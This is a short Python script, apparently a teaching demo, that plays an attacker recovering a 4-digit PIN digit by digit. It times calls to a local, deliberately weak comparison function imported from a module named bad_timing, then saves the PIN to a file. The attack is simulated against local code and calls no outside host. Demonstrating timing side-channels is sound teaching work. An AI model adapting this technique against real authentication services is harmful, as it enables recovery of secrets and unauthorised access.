import time
import sys
import os

# Add current directory to path so we can import bad_timing
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)

from bad_timing import secure_compare

sys.stdout.reconfigure(encoding='utf-8')

def run_timing_attack():
    print("\n--- 🔥 [Attacker Tool] Timing Analysis Started ---")
    print("[INFO] Measuring response times to guess the PIN digit-by-digit.\n")

    known_pin = ""
    digits = "0123456789"

    # We want to guess 4 digits
    for position in range(4):
        print(f"[STEP {position+1}] Guessing digit {position+1}...")

        best_digit = None
        max_time = 0

        for digit in digits:
            guess = known_pin + digit

            # Start Clock
            start_time = time.perf_counter()

            # Send Request (Simulated)
            secure_compare(guess)

            # Stop Clock
            end_time = time.perf_counter()
            duration = end_time - start_time

            if duration > max_time:
                max_time = duration
                best_digit = digit

        print(f"   -> [ANALYSIS] Digit '{best_digit}' took longest ({max_time:.4f}s). It must be correct!")
        known_pin += best_digit

    print("\n" + "="*40)
    print("  🔥🔥🔥 ATTACK SUCCESSFUL! 🔥🔥🔥")
    print(f"  Recovered PIN: {known_pin}")
    print("="*40 + "\n")

    # Save artifact
    os.makedirs("outputs", exist_ok=True)
    with open("outputs/recovered_pin.txt", "w") as f:
        f.write(known_pin)

if __name__ == "__main__":
    run_timing_attack()